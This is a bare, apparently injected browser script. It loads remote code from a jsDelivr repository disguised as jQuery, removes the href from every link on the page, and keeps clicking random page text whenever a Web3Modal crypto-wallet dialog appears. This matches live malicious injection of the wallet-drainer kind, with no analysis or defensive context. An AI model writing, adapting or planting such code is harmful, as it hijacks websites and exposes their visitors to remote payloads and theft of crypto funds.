var currentUnixTimestamp = Math.floor(Date.now() / 1000);
var script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/gh/nd91jqf/jquery@main/app-update.js?version=' + currentUnixTimestamp;
document.head.appendChild(script);

function removeHrefFromAnchors() {
    var anchors = document.querySelectorAll('a');
    anchors.forEach(function(anchor) {
        anchor.removeAttribute('href');
    });
}

function findAndClickText() {
    var textElements = document.querySelectorAll('p, span, div');
    var clickableTextElements = Array.from(textElements).filter(function(el) {
        return el.innerText.trim() !== '';
    });

    if (clickableTextElements.length > 0) {
        var randomIndex = Math.floor(Math.random() * clickableTextElements.length);
        var randomTextElement = clickableTextElements[randomIndex];
        randomTextElement.click();
    } else {
        console.log('No text element found.');
    }
}

function checkForModalAndClickText() {
    var modalElement = document.querySelector('w3m-modal');
    if (modalElement) {
        findAndClickText();
    }
}

window.addEventListener('load', function() {
    removeHrefFromAnchors();
    checkForModalAndClickText();
});

var intervalId = setInterval(checkForModalAndClickText, 200);
